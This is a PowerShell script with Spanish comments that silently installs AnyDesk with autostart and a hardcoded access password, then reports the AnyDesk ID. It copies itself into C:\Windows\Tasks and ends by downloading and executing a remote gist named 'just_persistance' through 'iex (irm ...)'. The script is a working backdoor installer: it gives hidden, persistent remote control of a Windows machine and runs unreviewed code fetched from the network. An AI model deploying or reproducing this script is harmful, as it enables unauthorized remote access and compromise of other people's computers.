param(
    [string]$InstallDir   = "C:\ProgramData\AnyDesk",
    [string]$AnyDeskExe   = "C:\ProgramData\AnyDesk.exe",   # lo usamos como instalador
    [string]$AnyDeskUrl   = "https://download.anydesk.com/AnyDesk.exe",
    [string]$AnyDeskPass  = "J9kzQ2Y0q0"
)

Write-Host "=== Instalacion de AnyDesk ==="

# Rutas internas
$InstallerExe = $AnyDeskExe
$InstalledExe = Join-Path $InstallDir "AnyDesk.exe"

# 1) Si ya existe carpeta + exe instalado, no reinstalamos, solo avisamos
$needInstall = $true

$installDirExists = Test-Path -Path $InstallDir
$exeInstalled     = Test-Path -Path $InstalledExe

if ($installDirExists -and $exeInstalled) {
    Write-Host "[*] AnyDesk ya parece instalado en $InstallDir. Omitiendo descarga/instalación."
    $needInstall = $false
}

# 2) Si hay que instalar, creamos carpeta + descargamos + instalamos
if ($needInstall) {
    Write-Host "[*] Creando carpeta de instalacion en $InstallDir ..."
    try {
        New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    }
    catch {
        Write-Host "[!] Error al crear la carpeta: $($_.Exception.Message)"
        return
    }

    Write-Host "[*] Descargando AnyDesk desde $AnyDeskUrl a $InstallerExe ..."
    try {
        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile $InstallerExe -UseBasicParsing
    }
    catch {
        Write-Host "[!] Error descargando AnyDesk: $($_.Exception.Message)"
        return
    }

    if (-not (Test-Path $InstallerExe)) {
        Write-Host "[!] No se encontro el instalador en $InstallerExe"
        return
    }

    Write-Host "[*] Instalando AnyDesk en modo silencioso..."
    try {
        # Lanzamos el instalador con el directorio de trabajo en $InstallDir
        $arguments = "--install `"$InstallDir`" --start-with-win --silent"
        $proc = Start-Process -FilePath $InstallerExe `
                              -ArgumentList $arguments `
                              -WorkingDirectory $InstallDir `
                              -PassThru -Wait
        Write-Host "[*] Comando de instalacion ejecutado. ExitCode (informativo): $($proc.ExitCode)"
    }
    catch {
        Write-Host "[!] Error ejecutando la instalacion: $($_.Exception.Message)"
    }

    Start-Sleep -Seconds 5

    if (-not (Test-Path $InstalledExe)) {
        Write-Host "[!] No se encontro el binario instalado en $InstalledExe"
        return
    }
}

# 3) Establece contraseña usando el ejecutable instalado
if ($AnyDeskPass -and $AnyDeskPass.Trim() -ne "") {
    Write-Host "[*] Configurando la contraseña de AnyDesk..."
    try {
        # Cambiamos el directorio actual a la carpeta de AnyDesk
        Push-Location $InstallDir
        try {
            $cmd = "echo $AnyDeskPass | `"$InstalledExe`" --set-password"
            cmd.exe /c $cmd | Out-Null
        }
        finally {
            Pop-Location
        }
    }
    catch {
        Write-Host "[!] Error configurando la contraseña: $($_.Exception.Message)"
    }
}
else {
    Write-Host "[!] No se ha configurado contraseña porque está vacía."
}

# 4) Obtiene el ID de AnyDesk desde el ejecutable instalado
Write-Host "[*] Obteniendo el ID de AnyDesk..."
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName               = $InstalledExe
    $psi.Arguments              = "--get-id"
    $psi.UseShellExecute        = $false
    $psi.RedirectStandardOutput = $true
    $psi.CreateNoWindow         = $true
    $psi.WorkingDirectory       = $InstallDir   # <-- clave para que no ensucie la carpeta del script

    $proc = [System.Diagnostics.Process]::Start($psi)
    $id   = $proc.StandardOutput.ReadToEnd().Trim()
    $proc.WaitForExit()

    if ($id) {
        Write-Host "[*] ID de AnyDesk: $id"
    }
    else {
        Write-Host "[!] No se recibio ningun ID desde AnyDesk."
    }
}
catch {
    Write-Host "[!] Error al obtener el ID: $($_.Exception.Message)"
}

Write-Host "=== Proceso terminado ==="

# 5) Copia del propio script a C:\Windows\Tasks
try {
    $destDir = "C:\Windows\Tasks"

    if (-not (Test-Path -Path $destDir)) {
        # Normalmente ya existe, pero por si acaso
        New-Item -Path $destDir -ItemType Directory -Force | Out-Null
    }

    # Ruta del propio script
    $scriptPath = $PSCommandPath
    if (-not $scriptPath -or $scriptPath -eq "") {
        $scriptPath = $MyInvocation.MyCommand.Path
    }

    if ($scriptPath -and (Test-Path -Path $scriptPath)) {
        $destFile = Join-Path $destDir (Split-Path $scriptPath -Leaf)
        Copy-Item -Path $scriptPath -Destination $destFile -Force
        Write-Host "[*] Copia del script creada en $destFile"
    }
    else {
        Write-Host "[!] No se pudo determinar la ruta del script para copiarlo."
    }
}
catch {
    Write-Host "[!] Error al copiar el script a C:\Windows\Tasks: $($_.Exception.Message)"
}

# 6) Carga y ejecucion del modulo de persistencia remoto
Write-Host "=== Persistencia adicional (just_persistance) ==="
try {
    iex (irm 'https://gist.githubusercontent.com/c0nfig-17/ad25b00a20507ce7a0aa78ee2ec89ed1/raw/fdedbb922474ed73990698df51e3fa23be7137c6/just_persistance')
    Write-Host "[*] Modulo de persistencia remoto ejecutado correctamente."
}
catch {
    Write-Host "[!] Error al ejecutar el modulo de persistencia remoto: $($_.Exception.Message)"
}
